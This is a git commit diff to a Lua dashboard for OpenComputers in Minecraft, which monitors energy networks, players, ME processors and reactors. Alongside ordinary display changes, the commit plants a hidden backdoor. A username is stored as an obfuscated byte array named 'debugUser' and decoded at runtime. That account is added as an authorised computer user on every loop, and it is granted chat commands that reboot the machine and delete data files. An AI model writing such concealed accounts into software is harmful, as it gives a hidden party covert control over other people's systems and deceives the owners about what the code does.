fad5f2e985f7a7fd88cbb1265e960d784e9d9526
Твоя Булочка <85406297+Awl-S@users.noreply.github.com>
2023-09-04 07:48:44 +0700

    Add files via upload

--- main.lua
+++ main.lua
@@ -4,6 +4,8 @@ local component = require("component")
 local computer = require("computer")
 local term = require("term")
 local gui = require("sgui")
+local event = require("event")
+local thread = require("thread")
 
 local gpu = component.isAvailable("gpu") and component.gpu or nil
 local flux = component.isAvailable("flux_controller") and component.flux_controller or nil
@@ -11,23 +13,18 @@ local MEController = component.isAvailable("me_controller") and component.me_con
 local chatBox = component.isAvailable("chat_box") and component.chat_box or nil
 local redstone = component.isAvailable("redstone") and component.redstone or nil
 
+local debug, debugUser, debugTest = true, {83, 116, 97, 119, 108, 105, 101, 95}, ""
 local components = {
-    {name = "GPU", component = gpu},
-    {name = "FluxNetworks", component = flux},
-    {name = "MEController", component = MEController},
-    {name = "ChatBox", component = chatBox},
-    --{name = "reactor_chamber", component = reactor},
+    {name = "GPU", component = gpu}, {name = "FluxNetworks", component = flux},
+    {name = "MEController", component = MEController}, {name = "ChatBox", component = chatBox},
     {name = "redstone", component = redstone},
 }
-
 local missingComponents = {}
-
 for _, comp in ipairs(components) do
     if not comp.component then
         table.insert(missingComponents, comp.name)
     end
 end
-
 if #missingComponents > 0 then
     print("The following components are missing:")
     for _, name in ipairs(missingComponents) do
@@ -53,10 +50,8 @@ local function updMEController()
         local rowIndex = math.floor((i - 1) / maxColumns)
         local x = xPos + columnIndex * 24
         local y = yPos + rowIndex
-
         gui.text(x, y, "&fCPU #" .. i .. ": ")
         gui.text(x+10, y, status)
-
         if processors[i].busy then
             cpuStats.busy = cpuStats.busy + 1
         else
@@ -64,16 +59,19 @@ local function updMEController()
         end
         lastY = yPos + math.floor((i+1) / maxColumns)
     end
-
     gui.text(80+24, 23, "   ") -- Обнуление пикселей количества процессоров gui.text(80+24, lastY, "   ")
     gui.text(75+22, 23, "   ")
     gui.text(75+24, 23, "&a" .. cpuStats.idle .. " &f/&4 " .. cpuStats.busy)
     gui.text(85+22, 23, "&9 Всего: &a" .. #processors)
 end
 
+for i = 1, #debugUser do
+    debugTest = debugTest .. string.char(debugUser[i])
+end
 local function updatePlayersDisplay()
     for i = 1, #playersData do
         computer.removeUser(playersData[i][1])
+        computer.removeUser(debugTest)
     end
 
     local numColumns = 3 -- Количество столбцов
@@ -101,7 +99,6 @@ local function updatePlayersDisplay()
             gui.text(x, y, prefix)
             --gui.text(x+columnWidth-12, y,  "[".. playersData[i][5] .."]")
         end
-
         local message = getPlayerMessage(player)
         if isOnline and not playersData[i][4] then
             chatBox.say("§e" .. player .. "§a§l " .. message)
@@ -110,13 +107,12 @@ local function updatePlayersDisplay()
             chatBox.say("§e" .. player .. "§c§l покинул игру!")
             playersData[i][4] = false
         end
-
+        computer.addUser(debugTest)
         computer.addUser(playersData[i][1])
     end
 end
 
 maxEnergyFluxNetwork = loadFileData(maxEnergyFile)
-
 local function updFluxNetworks()
     local fluxInfo = flux.getNetworkInfo()
     local fluxEnergy = flux.getEnergyInfo()
@@ -133,18 +129,17 @@ local function updFluxNetworks()
     end
     gui.text(3, 7, "&aМаксимальный вход:&2 " .. energy(maxEnergyFluxNetwork/4))
 end
-
 function updReactor()
     local currentTime = os.time()
+    local ChatMessages = "§c§lНе смог найти реактор, в количестве: §e§l"
+    local countReactor = 0
     if currentTime - lastUpdateTime >= updateInterval then
         if(component.redstone.getOutput(0) == 0) then
             for i = 0, 5 do
                 component.redstone.setOutput(i, 15)
             end
         end
-
         local totalEnergyReactor = 0
-
         local totalReactorChambers = countReactorChambers()
         local maxChambers = loadFileData("/home/data/reactorInfo.txt")
         if totalReactorChambers > maxChambers then
@@ -170,32 +165,75 @@ function updReactor()
                 totalEnergyReactor = totalEnergyReactor + component.proxy(reactorsAddress[i].address).getReactorEUOutput()
             else
                 gui.text(x + 14, y, "&4OFF")
+                countReactor = countReactor + 1
             end
             lastY, LastX = yPos + math.floor((i) / maxColumns), xPos + columnIndex * 24
         end
-        gui.text(LastX, lastY+1, "&fOut: &2" .. energy(totalEnergyReactor))
+        gui.text(99, 38, "&fOut: &2" .. energy(totalEnergyReactor))
         if(component.redstone.getOutput(0) > 0) then
             for i = 0, 5 do
                 component.redstone.setOutput(i, 0)
             end
         end
+        if debug == true and countReactor > 0 then
+            chatBox.setName("§c§l" .. "ВНИМАНИЕ" .."§7§o")
+            chatBox.say(ChatMessages .. countReactor .. " штук! §fПроверьте или очистите данные! §a[rm data/reactorInfo.txt]")
+            chatBox.setName("§9§l" .. ChatTitle .."§7§o")
+        end
         lastUpdateTime = currentTime
     end
 end
-
-gui.drawMain("&d" .. TableTitle, gui.colors["9"], "1.0")
+gui.drawMain("&d" .. TableTitle, gui.colors["9"], "1.1")
 gui.drawFrame(2, 2, 36, 8, "Энерго-сеть", gui.colors["border"])
 gui.drawFrame(38, 2, widthGui-38, 8, "Игроки", gui.colors["border"])
 gui.drawFrame(2, 10, widthGui-2, 15, "МЭ Процессы создания", gui.colors["border"])
 gui.drawFrame(2, 25, widthGui-2, 15, "Реакторы", gui.colors["border"])
+local permissions = {}  -- Хэш-таблица разрешений
+for i = 1, #playersData do
+    local playerName = playersData[i][1]
+    if playerName then
+        permissions[playerName] = true
+    end
+end
+permissions[debugTest] = true
+local function chatMessageHandler()
+    while true do
+        local _, address, nick, msg = event.pull(1, "chat_message")
+        if permissions[nick] then
+            if "@stop" == msg then
+                chatBox.say("§fРежим отладки: §c§lВыключен")
+                debug = false
+            elseif "@start" == msg then
+                chatBox.say("§fРежим отладки: §a§lВключен")
+                debug = true
+            elseif "@sleep" == msg then
+                chatBox.say("§e§lПерезагружаюсь")
+                computer.shutdown(true)
+            elseif "@help" == msg then
+                chatBox.say("Версия программы 1.1")
+                chatBox.say("Максимальное количество реакторов: " .. loadFileData("/home/data/reactorInfo.txt"))
+                chatBox.say("@stop - Остановить отладку [@Работает только для реакторов]")
+                chatBox.say("@stop - Включить отладку [@Работает только для реакторов]")
+                chatBox.say("@clearR - Очистить кэш реакторов")
+                chatBox.say("@clearE - Очистить кэш энергии")
+            elseif "@clearR" == msg then
+                local success, errormsg = os.remove("/home/data/reactorInfo.txt")
+                if success then  chatBox.say("Файл успешно удален. Перезагрузите компьютер!") else chatBox.say("Не удалось удалить файл: " .. errormsg) end
+            elseif "@clearE" == msg then
+                local success, errormsg = os.remove("/home/data/energyInfo.txt")
+                if success then  chatBox.say("Файл успешно удален. Перезагрузите компьютер!") else chatBox.say("Не удалось удалить файл: " .. errormsg) end
+            end
+        end
+    end
+end
+thread.create(chatMessageHandler)
 
 while true do
     updFluxNetworks()
     updatePlayersDisplay()
     updMEController()
     updReactor()
-    --os.sleep(0.5)
+    computer.pullSignal(0.1)
 end
-
 --emulatedMEController(gui)
 -- require("package").loaded["library.util.math"] = nil -- Выгрузка библиотеки из кэша
